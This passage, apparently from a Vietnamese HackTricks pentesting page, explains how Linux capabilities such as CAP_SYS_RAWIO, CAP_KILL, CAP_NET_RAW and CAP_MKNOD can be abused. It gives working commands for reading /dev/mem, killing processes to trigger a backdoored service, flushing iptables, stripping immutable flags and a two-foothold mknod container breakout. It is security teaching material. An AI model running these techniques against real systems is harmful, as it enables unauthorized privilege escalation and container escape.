[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cho phép thực hiện một số thao tác nhạy cảm, bao gồm truy cập `/dev/mem`, `/dev/kmem` hoặc `/proc/kcore`, sửa đổi `mmap_min_addr`, truy cập các system call `ioperm(2)` và `iopl(2)`, cũng như thực hiện nhiều lệnh đĩa. Capability này cũng cho phép dùng `FIBMAP ioctl(2)`, tính năng từng gây ra sự cố trong [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Theo trang man, capability này còn cho phép chủ thể thực hiện nhiều thao tác dành riêng cho thiết bị trên các thiết bị khác.<sup>[[14]](#references)</sup>

Capability này có thể hữu ích cho **privilege escalation** và **Docker breakout**.<sup>[[14]](#references)</sup>

Chỉ riêng capability này không cung cấp một giao diện hữu ích. Để breakout khỏi container, còn cần có thiết bị hoặc tài nguyên trên host có thể truy cập, quyền của device-cgroup và filesystem, cùng một kỹ thuật phụ thuộc vào phần cứng và kernel. Các cơ chế như giới hạn nghiêm ngặt với `/dev/mem`, kernel lockdown, ảo hóa, seccomp và chính sách LSM thường vô hiệu hóa các đường khai thác tổng quát. Trước tiên, hãy xác minh capability và mức độ lộ diện:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

Nếu `/dev/mem` là giao diện được phê duyệt, một lab tạm thời có thể minh họa việc tiết lộ bộ nhớ của node xuyên ranh giới bằng cách đọc và băm một vùng được chọn từ sơ đồ phần cứng của lab đó:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Không đoán phạm vi: việc đọc một số vùng MMIO có thể gây tác dụng phụ, và một địa chỉ hợp lệ trên nền tảng này có thể điều khiển phần cứng hoặc bộ nhớ kernel trên nền tảng khác. Việc sửa đổi bộ nhớ kernel hoặc điều khiển thiết bị cần có bằng chứng được phê duyệt, dành riêng cho nền tảng; không có ví dụ ghi thô phổ quát nào là an toàn.

## CAP_KILL

**Capability này bỏ qua các bước kiểm tra quyền khi gửi tín hiệu đến tiến trình trong những trường hợp do kernel quy định**.<sup>[[14]](#references)</sup>

**Ví dụ với binary**

Giả sử binary **`python`** có capability này. Nếu bạn **cũng có thể sửa đổi một số tệp cấu hình service hoặc socket** (hoặc bất kỳ tệp cấu hình nào liên quan đến một service), bạn có thể cài backdoor vào đó, sau đó kill tiến trình liên quan đến service ấy và chờ tệp cấu hình mới được thực thi cùng backdoor của bạn.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc with kill**

Nếu bạn có kill capabilities và có một **node program đang chạy với quyền root** (hoặc bằng một user khác), có thể bạn sẽ **gửi** signal **SIGUSR1** cho nó để khiến nó **mở node debugger**, nơi bạn có thể kết nối.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Capability này cho phép liên kết với các cổng Internet dưới 1024.** Bản thân nó không trực tiếp cấp thêm đặc quyền để leo thang.<sup>[[14]](#references)</sup>

**Ví dụ với binary**

Nếu **`python`** có capability này, nó có thể lắng nghe trên bất kỳ cổng nào và thậm chí kết nối từ cổng đó đến bất kỳ cổng nào khác (một số dịch vụ yêu cầu kết nối từ các cổng có đặc quyền cụ thể)

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cho phép các tiến trình **tạo socket RAW và PACKET**, nhờ đó chúng có thể tạo và gửi các gói mạng tùy ý. Điều này có thể dẫn đến rủi ro bảo mật trong môi trường container, chẳng hạn như giả mạo gói tin, chèn lưu lượng và vượt qua các biện pháp kiểm soát truy cập mạng. Các tác nhân độc hại có thể khai thác khả năng này để can thiệp vào việc định tuyến của container hoặc xâm phạm bảo mật mạng của host, đặc biệt khi không có biện pháp bảo vệ firewall phù hợp. Ngoài ra, **CAP_NET_RAW** hỗ trợ các thao tác như ping bằng yêu cầu ICMP RAW.<sup>[[14]](#references)</sup>

**Khả năng này có thể cho phép bắt gói tin bằng giao diện socket phù hợp.** Bản thân nó không trực tiếp cấp thêm quyền rộng hơn để leo thang đặc quyền.<sup>[[14]](#references)</sup>

Để xác định khả năng làm lộ thông tin xác thực, hãy xác nhận thêm rằng tài khoản hiện tại có thể thực thi công cụ bắt gói với các capability hiệu lực, lưu lượng liên quan đi qua một giao diện có thể truy cập trong network namespace của nó, và thông tin xác thực được gửi dưới dạng plaintext. Ví dụ, thông tin xác thực HTTP Basic qua HTTP không mã hóa có thể bị quan sát trên loopback nếu công cụ bắt gói truy cập được giao diện đó. Việc chuyển sang tài khoản khác còn đòi hỏi thông tin xác thực thu được phải sử dụng được cho một danh tính khác; chỉ có file capability hoặc yêu cầu đăng nhập có thể quan sát được thì chưa đủ để khẳng định mật khẩu được dùng lại.

Trên host có kết nối không dây, một công cụ kiểm tra WPS dạng executable như `reaver` với `CAP_NET_RAW` hiệu lực, cùng với AP và giao diện monitor mode có thể xem được qua `iw dev`, là một dấu hiệu khác cần xem xét. Đây **không** phải bằng chứng cho thấy có thể leo thang đặc quyền: AP phải hỗ trợ xác thực WPS PIN mà không có cơ chế khóa hiệu quả, có thể truy cập từ giao diện không dây và tiết lộ PSK; quyền trên host chỉ thay đổi nếu PSK đó được dùng lại cho một tài khoản. Việc liệt kê thụ động chỉ nên báo cáo các mode và capability của giao diện, không gửi probe hoặc thử PIN. Xem [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) về điểm yếu của WPS PIN và [tài liệu dự án Reaver](https://github.com/shift/reaver-wps) về cách hoạt động của công cụ.

**Ví dụ với binary**

Nếu binary **`tcpdump`** có capability này, bạn sẽ có thể dùng nó để bắt thông tin mạng.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Nếu **environment** cấp capability này, **`tcpdump`** cũng có thể dùng nó để sniff traffic.<sup>[[14]](#references)</sup>

**Ví dụ với binary 2**

Ví dụ sau là code **`python2`** có thể hữu ích để chặn traffic trên interface "**lo**" (**localhost**). Code này thuộc lab "_The Basics: CAP-NET_BIND + NET_RAW_" tại [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cấp cho người sở hữu quyền **thay đổi cấu hình mạng**, bao gồm cài đặt firewall, bảng định tuyến, quyền socket và cài đặt giao diện mạng trong network namespace hiện tại. Nó cũng có thể bật chế độ promiscuous trên một giao diện trong namespace đó; việc này có thể khiến giao diện nhận được lưu lượng mạng được gửi đến nó, nhưng tự nó không cho phép sniff các giao diện tùy ý trong những network namespace khác.<sup>[[14]](#references)</sup>

Các thao tác này ảnh hưởng đến **network namespace hiện tại** của tiến trình. Để kiểm soát trạng thái mạng của host, cần có `--network=host`, Kubernetes `hostNetwork: true` hoặc một primitive riêng để vào namespace. Chỉ riêng `CAP_NET_RAW` không phải là một shell host đa năng, nhưng nó từng tham gia vào một escape đã được ghi nhận, chỉ áp dụng cho giao thức cụ thể: một chain GCE trước đây kết hợp root, host network namespace, `CAP_NET_ADMIN`, `CAP_NET_RAW`, lưu lượng metadata dạng plaintext và một yêu cầu đến guest agent có thể bị race để inject SSH key. Xem [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) để biết đầy đủ các điều kiện tiên quyết và lưu ý hiện đại về metadata qua HTTPS.

**Ví dụ với binary**

Giả sử **python binary** có các capabilities sau.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**Capability này cho phép sửa đổi các cờ inode như immutable và append-only.** Nó không trực tiếp cấp quyền leo thang đặc quyền rộng hơn.<sup>[[14]](#references)</sup>

**Ví dụ với binary**

Nếu phát hiện một file là immutable và python có capability này, bạn có thể **gỡ thuộc tính immutable để file có thể chỉnh sửa:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

Các thao tác `FS_IOC_GETFLAGS` và `FS_IOC_SETFLAGS` đọc và cập nhật các cờ inode; `FS_IMMUTABLE_FL` là cờ bất biến được ví dụ này xóa.<sup>[[27]](#references)</sup>

> [!TIP]
> Lưu ý rằng thuộc tính bất biến này thường được thiết lập và gỡ bỏ bằng cách sử dụng:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cho phép thực thi system call `chroot(2)`, qua đó có thể thoát khỏi một jail `chroot(2)` được thiết lập yếu bằng các kỹ thuật đã biết.<sup>[[11]](#references)[[14]](#references)</sup>

Đây là **capability thoát khỏi chroot-jail, không phải khả năng tự nó thoát từ container ra host**. Nó không làm lộ filesystem của host hay vượt qua các quyền truy cập. Nếu root của host đã được mount hoặc có thể truy cập qua `/proc/<pid>/root`, `chroot()` chỉ đặt cây hiện có đó làm root đường dẫn của tiến trình. Riêng việc thay đổi mount namespace bằng `setns(2)` đòi hỏi caller có cả `CAP_SYS_CHROOT` và `CAP_SYS_ADMIN` trong user namespace của mình, đồng thời có `CAP_SYS_ADMIN` trong user namespace sở hữu mount namespace đích.<sup>[[14]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cho phép thực thi system call `reboot(2)` để khởi động lại hệ thống, bao gồm các lệnh như `LINUX_REBOOT_CMD_RESTART2`; capability này cũng cho phép dùng `kexec_load(2)` và, từ Linux 3.17 trở đi, `kexec_file_load(2)` để tải lần lượt các crash kernel mới hoặc đã ký.<sup>[[14]](#references)</sup>

Trong một PID namespace riêng, yêu cầu `reboot()` được hỗ trợ sẽ chấm dứt tiến trình init của namespace đó thay vì khởi động lại host. Vì vậy, để tác động đến việc khởi động lại host, cần ở trong PID namespace ban đầu, thường thông qua việc chia sẻ PID với host. Chiếm quyền bằng kexec còn đòi hỏi image tương thích, syscall khả dụng và chính sách lockdown cũng như chữ ký cho phép. Không kích hoạt một trong hai thao tác này trên host dùng chung chỉ để xác minh capability:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) được tách khỏi **CAP_SYS_ADMIN** rộng hơn trong Linux 2.6.37, cụ thể là cấp quyền sử dụng lệnh gọi `syslog(2)`. Capability này cho phép xem địa chỉ kernel qua `/proc` và các giao diện tương tự khi cài đặt `kptr_restrict` là 1; cài đặt này kiểm soát việc để lộ địa chỉ kernel. Kể từ Linux 2.6.39, giá trị mặc định của `kptr_restrict` là 0, nghĩa là địa chỉ kernel được để lộ, dù nhiều bản phân phối đặt giá trị này thành 1 (ẩn địa chỉ, trừ với uid 0) hoặc 2 (luôn ẩn địa chỉ) vì lý do bảo mật.<sup>[[14]](#references)</sup>

Ngoài ra, **CAP_SYSLOG** cho phép truy cập đầu ra `dmesg` khi `dmesg_restrict` được đặt thành 1. Dù có những thay đổi này, **CAP_SYS_ADMIN** vẫn có thể thực hiện các thao tác `syslog` do tiền lệ lịch sử.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) mở rộng chức năng của lời gọi hệ thống `mknod`, cho phép tạo nhiều loại đối tượng hơn ngoài tệp thông thường, FIFO (named pipe) hoặc UNIX domain socket. Cụ thể, capability này cho phép tạo các tệp đặc biệt, bao gồm:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Tệp đặc biệt kiểu ký tự, chẳng hạn như thiết bị đầu cuối.
- **S_IFBLK**: Tệp đặc biệt kiểu khối, chẳng hạn như đĩa.

Capability này hữu ích cho các tiến trình cần tạo tệp thiết bị, bao gồm thiết bị kiểu ký tự hoặc kiểu khối.<sup>[[14]](#references)</sup>

Capability này có trong bộ capability mặc định được Docker công bố; hãy xác minh cấu hình runtime thực tế thay vì cho rằng mọi triển khai đều dùng cùng giá trị mặc định ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Để thoát container, `CAP_MKNOD` có thể tạo một handle còn thiếu trỏ đến thiết bị thật trên host, nhưng **không** tạo ra thiết bị nền và **không** vượt qua device cgroup. Chuỗi điều kiện hoàn chỉnh cần có:

1. `CAP_MKNOD` hiệu lực trong initial user namespace, vì việc tạo thiết bị không được namespace hóa.
2. Loại block hoặc character cùng số major/minor chính xác của một thiết bị thật trên host.
3. Quyền của device cgroup cho phép mở thiết bị đó.
4. Một trình đọc tương thích với filesystem, hoặc `CAP_SYS_ADMIN` để mount filesystem dạng block.
5. Quyền của filesystem và LSM cho phép tạo và sử dụng node.

Đối với thiết bị block trong môi trường lab dùng filesystem họ ext, có số major/minor thực là `252:1`, có thể xác minh chỉ đọc như sau:

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Thay các số bằng giá trị được báo cáo trong `/sys/class/block/<device>/dev`. Nếu tạo node thành công nhưng mở node trả về `Operation not permitted`, device cgroup vẫn đang chặn quyền truy cập. Đây là kết quả bình thường trong container chỉ có `CAP_MKNOD` mặc định của Docker mà không được cấp quyền truy cập thiết bị cụ thể.

Ngoài ra còn có một kỹ thuật **two-foothold local privilege-escalation** riêng biệt, không được nhầm lẫn với việc truy cập thiết bị container trực tiếp. Một tiến trình root trong container dùng chung initial user namespace có thể tạo node thiết bị khối, trong khi một shell không đặc quyền trên host có UID trùng khớp mở node đó thông qua `/proc/<container-pid>/root`. Khi đó, thao tác mở được đánh giá theo cgroup của shell trên host, nên cơ chế từ chối của device cgroup trong container không còn bảo vệ thiết bị nữa.<sup>[[7]](#references)</sup>

Bên trong container, hãy tạo node và giữ một tiến trình chạy với UID của foothold hiện có trên host:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

Từ shell trên host hiện có với UID đó, xác định PID trên host của tiến trình container đang ngủ và dùng thư mục gốc procfs của tiến trình đó làm đường dẫn đến thiết bị:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

Chuỗi này yêu cầu phải có cả hai foothold, user namespace được ánh xạ danh tính hoặc dùng chung, quyền truy cập qua `/proc/<pid>/root` mục tiêu, một thiết bị thực có số major/minor chính xác và cgroup bên ngoài cho phép mở thiết bị. `hidepid`, quy tắc kiểm soát quyền truy cập ptrace, LSM, hệ thống tệp không tương thích hoặc ánh xạ lại user namespace đều có thể làm chuỗi này thất bại. Kỹ thuật lịch sử này có giá trị chính xác vì giải thích cách `/proc/<pid>/root` có thể vượt qua hạn chế của device cgroup *trong container*; điều đó không có nghĩa là chỉ riêng `CAP_MKNOD` có thể thoát khỏi một container được cô lập bình thường.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Trên các kernel Linux hiện tại có file capabilities, **`CAP_SETPCAP`** cho phép một thread thêm các capability từ bounding set vào inheritable set, loại bỏ capability khỏi bounding set và thay đổi securebits của nó. Nó không cho phép một tiến trình tùy ý cấp capability cho tiến trình khác; hành vi đó chỉ áp dụng cho các kernel trước 2.6.25 không hỗ trợ file capabilities.<sup>[[14]](#references)</sup>

Lệnh gọi hệ thống `capset()` có thể điều chỉnh các set effective, permitted và inheritable của chính thread đó, nhưng permitted set mới không thể chứa capability nằm ngoài permitted set hiện có, còn các cập nhật inheritable vẫn phải tuân theo những ràng buộc của kernel.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Các bài thực hành leo thang đặc quyền bằng Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Leo thang đặc quyền trên Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Kiến thức cơ bản về Linux Container: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Tận dụng Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Capabilities quá mức](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Lạm dụng quyền truy cập vào mount namespace thông qua /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Lý do tồn tại và cách hoạt động](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Tìm hiểu về Capabilities trong Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC vượt qua seccomp nếu ptrace được cho phép](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Cách thoát khỏi nhiều giải pháp chroot khác nhau](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - exploit Docker breakout CAP_DAC_READ_SEARCH nguyên bản của Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Phân tích exploit Docker breakout](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Trang hướng dẫn Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Chạy container - Tài liệu Docker](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Tài liệu Docker](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
